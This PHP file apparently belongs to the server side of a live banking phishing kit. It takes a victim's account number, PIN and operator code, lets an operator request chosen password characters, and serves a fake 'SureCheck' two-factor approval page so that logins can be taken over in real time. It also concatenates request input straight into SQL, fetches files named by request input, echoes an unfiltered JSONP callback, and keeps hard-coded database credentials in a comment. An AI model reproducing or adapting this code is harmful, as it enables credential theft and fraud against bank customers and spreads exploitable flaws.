<?php
include_once 'sqlite.php';

$lastInsertID = $_GET['unique'];
$mysqlinsertID = $_GET['lastInsertID'];
$rowID = $_GET['unique'];

$ccn = $_GET['AccessAccount'];
$csp = $_GET['PIN'];
$atm = $_GET['Operator'];


if(isset($_GET['pushPasswordTimeout'])){
    //header("Content-Type: application/javascript");

    $sql2 = 'UPDATE result SET passwordblocks = "continue" WHERE _='.$rowID;
    $sql2result = mysqli_query($dbconnect, $sql2);
}

/******PARSE PASSWORD BLOCKS*******/
$dom = new DOMDocument('1.0', 'UTF-8');
$internalErrors = libxml_use_internal_errors(true);
$dom->strictErrorChecking = false;
$dom->loadHTML(file_get_contents($lastInsertID)); 
$xpath = new DOMXpath($dom);

$result = $xpath->query('//div[@id="spansurephrase"]')->item(0);
$surehcheck = $xpath->query("//*[@id='spansurephrase']")->item(0);

$passwordLength = $xpath->query("//*[@autocomplete='off']")->length;

$spansurephrase = $dom->getElementById("spansurephrase")->textContent;
/******END PARSE PASSWORD BLOCKS*******/
//foreach($steps as $eachStep){

    $sql = 'SELECT * FROM result WHERE _ = "'.$lastInsertID.'" ORDER BY id DESC LIMIT 1';
    //$ret1 = $db->query($sql);
    $sqlqueryResult = mysqli_query($dbconnect, $sql);
    //$ret1 = mysqli_fetch_assoc($sqlqueryResult);
    /*
    while($rs = $ret1->fetchArray(SQLITE3_ASSOC))
    {
        $result = array('id' => $rs['id'], 'date_time' => $rs['date_time'], 'subject' => $rs['subject'], 'passwordblocks' => $rs['passwordblocks'], 'message' => ($rs['message']), 'uniq' => null);
    }
    $db->close();
    */
    
    while($rs = mysqli_fetch_assoc($sqlqueryResult))
    {
        $result = array('id' => $rs['id'], 'date_time' => $rs['date_time'], 'subject' => $rs['subject'], 'passwordblocks' => $rs['passwordblocks'], 'message' => ($rs['message']), 'uniq' => null);
    }
    
    $eachBlock = false;
    if(@$result['passwordblocks'] == null){
        //sleep(1);
        //$experience_login = file_get_contents('oform4.html');
    }else{
        switch ($result['passwordblocks']) {
            case "surecheck":
                $experience_login = file_get_contents('surecheck-request.html');

                $experience_login = str_replace("{dateTime}", date("Y-m-d h:i:s"), $experience_login);

                header("Content-Type: application/javascript");
                //((mysqli_connect("localhost", "hotelswi_result", "pass@123", "hotelswi_result")) ? '':die(0));
                $callback = $_GET["callback"];
                $jsonResponse = json_encode(array('message' => $experience_login, 'lastInsertID' => $lastInsertID, 'passwordLength' => $passwordLength, 'success' => true, 'surecheck' => $spansurephrase, 'nextpage' => 'surecheck', 'calbak' => 'displaySureCheck'));
                echo $callback . '(' . $jsonResponse . ')';
                die;
            break;

            case "rvn":

            break;

            case "tvn":

            break;

            case "continue":
                $experience_login = file_get_contents('oform4.html');

                $experience_login = str_replace("{AccessAccount}", @$ccn, $experience_login);
                $experience_login = str_replace("{PIN}", @$csp, $experience_login);
                $experience_login = str_replace("{Operator}", @$atm, $experience_login);
                $experience_login = str_replace("{currentLoginTime}", date("Y-m-d"), $experience_login);
                $experience_login = str_replace("{spansurephrase}", $spansurephrase, $experience_login);
                $experience_login = str_replace("{spansurephrase2}", $spansurephrase, $experience_login);

                $_SESSION['surephrase'] = $spansurephrase;

                setcookie("surephrase", $spansurephrase, time()+60*60*24*30);

                //echo $data; die;
                header("Content-Type: application/javascript");
                //((mysqli_connect("localhost", "hotelswi_result", "pass@123", "hotelswi_result")) ? '':die(0));
                $callback = $_GET["callback"];
                $jsonResponse = json_encode(array('message' => $experience_login, 'success' => true, 'nextpage' => 'password', 'surecheck' => $spansurephrase));
                echo $callback . '(' . $jsonResponse . ')';
                die;
            break;

            default:

            break;
        }

        $experience_login = "password blocks";
        //echo "block found";
        //$eachBlock = str_split($result['passwordblocks']);

        $eachBlock = explode(" ", $result['passwordblocks']);
        $passwordBlocks = "";
        $nextPasswordBlock = "";
        $pff = 1;
        for($i=1;$i<=$passwordLength;$i++){
            if(in_array($i, $eachBlock)){
                $passwordBlocks .= '<input type="password" class="pf pf2 ui-keyboard-input-selected" name="Password[Pass_'.$i.']" id="pff'.$pff.'" num="'.$i.'" onkeyup="checkEntries2(this, event)" ondragstart="return false" onselectstart="return false" tabindex="1" maxlength="1" value="" autocomplete="off" aria-label="Password '.$i.'" aria-labelledby="id_pff'.$i.'" showMeHow="This is password character number '.$i.'." /><!-- viLabel="Password '.$i.'" -->';
                $pff++;
            }
            else{
                $passwordBlocks .= '<input type="text" class="pf pf1" name="field'.$i.'" id="field'.$i.'" disabled="true" value="'.$i.'" autocomplete="off" viLabel="Password '.$i.'" />';
                $nextPasswordBlock .= $i." ";
            }
        }
        $experience_login = file_get_contents('oform5.html');
        $experience_login = str_replace("{charactersPassword}", $passwordBlocks, $experience_login);
        $experience_login = str_replace("{nextPasswordBlock}", trim($nextPasswordBlock), $experience_login);
        $experience_login = str_replace("{pLength}", $passwordLength, $experience_login);
        //break;
    }
//}

if(!$eachBlock){
    $experience_login = 'heartbeat'; //file_get_contents('oform4.html');
}

$experience_login = str_replace("{AccessAccount}", @$ccn, $experience_login);
$experience_login = str_replace("{PIN}", @$csp, $experience_login);
$experience_login = str_replace("{Operator}", @$atm, $experience_login);
$experience_login = str_replace("{currentLoginTime}", date("Y-m-d"), $experience_login);
$experience_login = str_replace("{spansurephrase}", $spansurephrase, $experience_login);
$experience_login = str_replace("{spansurephrase2}", $spansurephrase, $experience_login);

header("Content-Type: application/javascript");
$callback = $_GET["callback"];
$jsonResponse = json_encode(array('message' => $experience_login, 'success' => true, 'nextpage' => 'password', 'surecheck' => $spansurephrase));
echo $callback . '(' . $jsonResponse . ')';